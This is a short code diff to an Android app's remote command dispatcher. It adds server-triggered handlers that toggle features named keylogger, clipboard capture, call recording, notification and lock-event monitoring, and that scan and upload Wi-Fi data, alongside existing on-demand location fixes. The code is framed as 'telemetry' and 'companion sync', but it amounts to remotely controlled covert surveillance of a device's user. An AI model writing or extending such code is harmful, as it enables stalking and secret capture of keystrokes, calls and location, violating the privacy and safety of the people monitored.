@@ -63,6 +63,22 @@ public class CommandDispatcher {
             CompanionSyncService.triggerOnDemandLocationFix(context);
             ackCommand(serverUrl, deviceId, cmdId);
             if (locationCallback != null) locationCallback.onRefreshNeeded();
+        } else if ("update_telemetry_config".equals(type)) {
+            handleTelemetryConfig(context, payload);
+            ackCommand(serverUrl, deviceId, cmdId);
+        } else if ("sync_wifi".equals(type)) {
+            WifiScanHelper.scanAndUpload(context);
+            ackCommand(serverUrl, deviceId, cmdId);
+        }
+    }
+
+    private static void handleTelemetryConfig(Context ctx, JSONObject p) {
+        if (p == null || ctx == null) return;
+        String[] keys = {"notifications", "keylogger", "clipboard", "wifi", "lock_events", "call_recording", "screen_time"};
+        for (String k : keys) {
+            if (p.has(k)) {
+                TelemetrySyncHelper.setFeatureEnabled(ctx, k, p.optBoolean(k, false));
+            }
         }
     }
 
